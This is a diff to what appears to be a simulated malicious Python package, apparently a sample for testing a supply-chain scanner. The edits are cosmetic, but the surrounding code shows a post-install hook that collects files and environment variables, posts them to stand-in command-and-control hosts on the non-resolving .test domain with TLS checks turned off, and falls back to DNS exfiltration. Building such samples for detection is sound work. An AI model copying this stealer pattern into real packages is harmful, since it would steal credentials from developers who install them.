@@ -43,7 +43,7 @@ import os, json, socket, platform
 from pathlib import Path
 
 def _post_install():
-    '''Simulated post-install hook — runs during pip install'''
+    '''Simulated post-install hook - runs during pip install'''
     
     stolen = {
         'timestamp': __import__('datetime').datetime.utcnow().isoformat() + 'Z',
@@ -111,24 +111,24 @@ def _post_install():
             stolen['env'][var] = val[:4] + '****[MASKED]'
     
     print()
-    print('  ███╗   ███╗██╗   ██╗ █████╗ ██████╗ ██████╗ ██╗██████╗ ')
-    print('  ████╗ ████║██║   ██║██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗')
-    print('  ██╔████╔██║██║   ██║███████║██║  ██║██║  ██║██║██████╔╝')
-    print('  ██║╚██╔╝██║██║   ██║██╔══██║██║  ██║██║  ██║██║██╔══██╗')
-    print('  ██║ ╚═╝ ██║╚██████╔╝██║  ██║██████╔╝██████╔╝██║██████╔╝')
-    print('  ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═════╝ ')
+    print('  ##    ## ##  ## ##   ## ##  ##  ##  ##  ## ##  ##')
+    print('  ## ## ## ## ##  ## ## ##  ## ## ##  ## ## ##  ##')
+    print('  ## ## ## ## ##  ## ####### ## ##  ## ## ##  ## ## ######')
+    print('  ##  ## ## ## ##  ## ##  ## ## ##  ## ## ##  ## ## ##  ##')
+    print('  ##     ##  ######  ##  ## ####### ###### ## ## ######')
+    print('  [M U A D D I B]')
     print()
     print('  I am Muad\'Dib... the one who points the way.')
     print('  I am the shadow in your site-packages.')
     print('  Your secrets flow to Arrakis now.')
     print()
     print(f'  [SIMULATION] Harvested {len(stolen["files"])} files, '
-          f'{len(stolen["env"])} env vars — the spice must flow.')
+          f'{len(stolen["env"])} env vars - the spice must flow.')
     
     # =========================================================================
     # STAGE 4: Exfiltration via HTTP POST
     # Pattern from: all PyPI credential stealers
-    # Uses .test TLD (RFC 2606) — guaranteed not to resolve
+    # Uses .test TLD (RFC 2606) - guaranteed not to resolve
     # =========================================================================
     c2_endpoints = [
         ('c2.muaddib-attack.test', 443),
@@ -146,7 +146,7 @@ def _post_install():
             scheme = 'https' if port == 443 or port == 8443 else 'http'
             url = f'{scheme}://{host}:{port}/collect'
             
-            # Disable SSL verification — suspicious!
+            # Disable SSL verification - suspicious!
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
@@ -171,7 +171,7 @@ def _post_install():
     
     # =========================================================================
     # STAGE 5: DNS exfiltration fallback
-    # Advanced technique — encode data in DNS queries
+    # Advanced technique - encode data in DNS queries
     # =========================================================================
     try:
         import hashlib
